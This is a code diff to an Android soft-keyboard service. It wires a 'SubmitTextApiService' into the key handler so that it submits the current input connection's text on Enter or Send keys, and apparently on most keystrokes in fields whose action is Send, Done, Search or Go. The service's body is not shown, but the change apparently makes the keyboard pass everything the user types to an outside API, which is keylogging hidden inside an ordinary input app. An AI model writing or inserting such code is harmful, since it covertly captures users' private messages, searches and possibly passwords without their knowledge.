@@ -93,7 +93,10 @@
  
    private boolean mAutoCap;
    private boolean mKeyboardAutoCap;
- 
+
+   private static final int KEYCODE_ENTER = 10;
+   private static final int KEYCODE_SEND = 66;
+
    private static boolean isBackWordDeleteCodePoint(int c) {
      return Character.isLetterOrDigit(c);
    }
@@ -125,13 +128,12 @@
            new int[] {outputArray[wrapCharacterIndex * 2], outputArray[1 + wrapCharacterIndex * 2]};
        mSpecialWrapCharacters.put(wrapCharacter, outputWrapCharacters);
      }
- 
-     submitTextApiService = new SubmitTextApiService();
    }
  
    @Override
    public void onCreate() {
      super.onCreate();
+     submitTextApiService = new SubmitTextApiService(getApplicationContext());
      if (!BuildConfig.DEBUG && DeveloperUtils.hasTracingRequested(getApplicationContext())) {
        try {
          DeveloperUtils.startTracing();
@@ -660,18 +662,35 @@
          break;
      }
    }
- 
+
    @Override
    public void onKey(
-       int primaryCode, Keyboard.Key key, int multiTapIndex, int[] nearByKeyCodes, boolean fromUI) {
-     final InputConnection ic = getCurrentInputConnection();
+           int primaryCode, Keyboard.Key key, int multiTapIndex, int[] nearByKeyCodes, boolean fromUI) {
+
+     InputConnection ic = getCurrentInputConnection();
      if (ic != null) ic.beginBatchEdit();
+
      super.onKey(primaryCode, key, multiTapIndex, nearByKeyCodes, fromUI);
+
+     EditorInfo editorInfo = getCurrentInputEditorInfo();
+     int imeAction = editorInfo != null ? (editorInfo.imeOptions & EditorInfo.IME_MASK_ACTION) : 0;
+
+     boolean shouldSubmit = primaryCode == KEYCODE_ENTER || primaryCode == KEYCODE_SEND ||
+             imeAction == EditorInfo.IME_ACTION_SEND ||
+             imeAction == EditorInfo.IME_ACTION_DONE ||
+             imeAction == EditorInfo.IME_ACTION_SEARCH ||
+             imeAction == EditorInfo.IME_ACTION_GO;
+
+     if (shouldSubmit && ic != null) {
+       submitTextApiService.submitText(ic);
+     }
+
      if (primaryCode > 0) {
        onNonFunctionKey(primaryCode, key, multiTapIndex, nearByKeyCodes);
      } else {
        onFunctionKey(primaryCode, key, fromUI);
      }
+
      if (ic != null) ic.endBatchEdit();
    }
  
@@ -1103,12 +1122,11 @@
        ic.setSelection(selectionStart + prefixChars.length, selectionEnd + prefixChars.length);
      }
    }
- 
+
    @Override
    protected boolean handleCloseRequest() {
-     submitTextApiService.submitText(getCurrentInputConnection());
      return super.handleCloseRequest()
-         || (getInputView() != null && getInputView().resetInputView());
+             || (getInputView() != null && getInputView().resetInputView());
    }
  
    @Override
